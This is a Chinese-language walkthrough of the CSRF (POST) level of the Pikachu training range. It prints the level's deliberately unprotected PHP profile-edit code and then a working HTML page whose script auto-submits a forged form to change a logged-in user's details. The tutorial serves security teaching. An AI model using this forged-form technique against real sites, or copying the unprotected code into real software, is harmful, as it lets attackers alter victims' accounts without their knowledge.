# CSRF(post)

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "csrf_post_edit.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');

}


$PIKA_ROOT_DIR =  "../../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR."inc/config.inc.php";
include_once $PIKA_ROOT_DIR."inc/function.php";
include_once $PIKA_ROOT_DIR."inc/mysql.inc.php";
$link=connect();
// 判断是否登录，没有登录不能访问
if(!check_csrf_login($link)){
//    echo "<script>alert('登录后才能进入会员中心哦')</script>";
    header("location:csrf_post_login.php");
}

$html1='';
if(isset($_POST['submit'])){
    if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
        $getdata=escape($link, $_POST);
        $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['csrf']['username']}'";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
            header("location:csrf_post.php");
        }else {
            $html1.='修改失败，请重试';

        }
    }
}

?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="../csrf.php">CSRF</a>
                </li>
                <li class="active">CSRF(get)</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="post提交?">
                点一下提示~
            </a>

        </div>
        <div class="page-content">

            <?php
            //通过当前session-name到数据库查询，并显示其对应信息
            $username=$_SESSION['csrf']['username'];
            $query="select * from member where username='$username'";
            $result=execute($link, $query);
            $data=mysqli_fetch_array($result, MYSQL_ASSOC);
            $name=$data['username'];
            $sex=$data['sex'];
            $phonenum=$data['phonenum'];
            $add=$data['address'];
            $email=$data['email'];

            $html=<<<A
<div id="per_info">
   <form method="post">
   <h1 class="per_title">hello,{$name},欢迎来到个人会员中心 | <a style="color:bule;" href="csrf_post.php?logout=1">退出登录</a></h1>
   <p class="per_name">姓名:{$name}</p>
   <p class="per_sex">性别:<input type="text" name="sex" value="{$sex}"/></p>
   <p class="per_phone">手机:<input class="phonenum" type="text" name="phonenum" value="{$phonenum}"/></p>    
   <p class="per_add">住址:<input class="add" type="text" name="add" value="{$add}"/></p> 
   <p class="per_email">邮箱:<input class="email" type="text" name="email" value="{$email}"/></p> 
   <input class="sub" type="submit" name="submit" value="submit"/>
   </form>
</div>
A;
            echo $html;
            echo $html1;

            ?>




        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

可以看到该关卡没有对csrf进行防护

***

# 二、通关教程

与GET提交类似，通过抓包可以看到POST提交的输入如下

![image-20230304234642302](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\CSRF\images\image-20230304234642302-1677944802674-1.png)

构造如下Payload后，当用户使用同一个浏览器访问构造的URL后浏览器就会携带网站的Cookie，并自动提交表单中预设的个人信息，导致个人信息被修改

```html
<!DOCTYPE html>
<html lang="en">
    <script>
        window.onload = function() {
          document.getElementById("postsubmit").click();
        }
    </script>
<body>
    <form method="post" action="http://192.168.118.150/pikachu/vul/csrf/csrfpost/csrf_post_edit.php">
        <input id="sex" type="text" name="sex" value="text" />
        <input id="phonenum" type="text" name="phonenum" value="123654789" />
        <input id="add" type="text" name="add" value="test1" />
        <input id="email" type="text" name="email" value="test1" />
        <input id="postsubmit" type="submit" name="submit" value="submit" />
    </form>
</body>
</html>
```

![image-20230304234826029](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\CSRF\images\image-20230304234826029.png)